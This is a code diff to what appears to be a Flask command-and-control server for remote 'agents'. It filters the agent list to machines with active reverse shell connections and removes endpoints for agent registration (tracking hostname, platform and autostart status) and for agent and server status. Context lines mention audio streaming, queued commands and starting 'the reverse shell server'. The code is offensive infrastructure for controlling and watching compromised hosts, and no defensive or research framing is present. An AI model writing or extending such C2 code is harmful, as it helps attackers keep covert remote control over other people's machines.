@@ -1823,8 +1823,15 @@ def stream_audio():
 def get_agents():
     """
     Lists all agents that have checked in and their last seen time.
+    Only shows agents with active reverse shell connections.
     """
-    return jsonify(AGENTS_DATA)
+    # Filter agents to only include those with active reverse shell connections
+    active_agents = {}
+    for agent_id, agent_data in AGENTS_DATA.items():
+        if agent_id in REVERSE_SHELL_CONNECTIONS:
+            active_agents[agent_id] = agent_data
+    
+    return jsonify(active_agents)
 
 # --- File Management Endpoints ---
 
@@ -2083,84 +2090,6 @@ def post_output(agent_id):
 
     AGENTS_DATA[agent_id]["output"].append(output)
     return jsonify({"status": "output received"})
-
-@app.route("/register", methods=["POST"])
-def register_agent():
-    """Register a new agent with autostart capabilities"""
-    try:
-        data = request.get_json()
-        if not data:
-            return jsonify({"status": "error", "message": "No data provided"}), 400
-        
-        agent_id = data.get("id")
-        if not agent_id:
-            return jsonify({"status": "error", "message": "Agent ID required"}), 400
-        
-        # Initialize or update agent data
-        if agent_id not in AGENTS_DATA:
-            AGENTS_DATA[agent_id] = {
-                "command": "sleep",
-                "output": [],
-                "hostname": data.get("hostname", "unknown"),
-                "platform": data.get("platform", "unknown"),
-                "auto_started": data.get("auto_started", False),
-                "capabilities": data.get("capabilities", []),
-                "last_seen": datetime.datetime.now(),
-                "registration_time": datetime.datetime.now(),
-                "connection_count": 1
-            }
-        else:
-            # Update existing agent
-            AGENTS_DATA[agent_id]["hostname"] = data.get("hostname", AGENTS_DATA[agent_id].get("hostname", "unknown"))
-            AGENTS_DATA[agent_id]["platform"] = data.get("platform", AGENTS_DATA[agent_id].get("platform", "unknown"))
-            AGENTS_DATA[agent_id]["capabilities"] = data.get("capabilities", AGENTS_DATA[agent_id].get("capabilities", []))
-            AGENTS_DATA[agent_id]["last_seen"] = datetime.datetime.now()
-            AGENTS_DATA[agent_id]["connection_count"] = AGENTS_DATA[agent_id].get("connection_count", 0) + 1
-        
-        print(f"Agent {agent_id} registered successfully - Platform: {data.get('platform')}, "
-              f"Hostname: {data.get('hostname')}, Auto-started: {data.get('auto_started')}")
-        
-        return jsonify({
-            "status": "success", 
-            "message": "Agent registered successfully",
-            "agent_id": agent_id,
-            "server_time": datetime.datetime.now().isoformat()
-        })
-        
-    except Exception as e:
-        print(f"Registration error: {e}")
-        return jsonify({"status": "error", "message": str(e)}), 500
-
-@app.route("/status", methods=["GET"])
-def server_status():
-    """Provide server status for health checks"""
-    return jsonify({
-        "status": "healthy",
-        "timestamp": datetime.datetime.now().isoformat(),
-        "active_agents": len(AGENTS_DATA),
-        "version": "3.0-autostart"
-    })
-
-@app.route("/agent/<agent_id>/status", methods=["GET"])
-def agent_status(agent_id):
-    """Get detailed status of a specific agent"""
-    if agent_id not in AGENTS_DATA:
-        return jsonify({"status": "error", "message": "Agent not found"}), 404
-    
-    agent_data = AGENTS_DATA[agent_id]
-    return jsonify({
-        "status": "active",
-        "agent_id": agent_id,
-        "hostname": agent_data.get("hostname", "unknown"),
-        "platform": agent_data.get("platform", "unknown"),
-        "capabilities": agent_data.get("capabilities", []),
-        "auto_started": agent_data.get("auto_started", False),
-        "last_seen": agent_data.get("last_seen", "unknown"),
-        "registration_time": agent_data.get("registration_time", "unknown"),
-        "connection_count": agent_data.get("connection_count", 0),
-        "pending_command": agent_data.get("command", "sleep"),
-        "output_count": len(agent_data.get("output", []))
-    })
 
 if __name__ == "__main__":
     # Start the reverse shell server
